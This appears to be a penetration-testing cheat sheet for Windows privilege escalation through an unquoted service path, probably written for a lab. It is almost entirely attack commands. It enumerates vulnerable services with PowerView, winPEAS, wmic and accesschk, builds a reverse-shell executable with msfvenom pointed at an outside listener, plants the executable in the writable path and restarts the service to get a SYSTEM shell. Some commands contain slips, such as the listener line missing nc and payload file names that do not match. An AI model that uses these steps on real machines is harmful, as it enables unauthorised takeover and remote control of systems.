Find unquoted service path:
. .\PowerView.ps1;Invoke-AllChecks
.\winPEASany.exe
or
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

Gives information on service related to the executable file in the unquoted path:
sc.exe qc unquotedsvc

List permissions of the directory
.\accesschk64.exe /accepteula -uwqd "C:\Program Files\Unquoted Path Service\"

Check if you can start and stop the service:
sc.exe start unquotedsvc
sc.exe stop unquotedsvc

and here we can just create a simple reverse shell as we have a very clear threat surface
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.3.155 LPORT=443 -f exe > common.exe

Next, place the executable in a writeable folder in the unquoted path. Windows will read yours before the original executable due to how windows handles parsing data in an unqouted context. 
copy C:\users\user\jaja\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

rlwrap -lvnp 443

sc.exe query unquotedsvc
sc.exe start unquotedsvc

next if everything went accordingly, an nt authority\system shell is waiting for you :)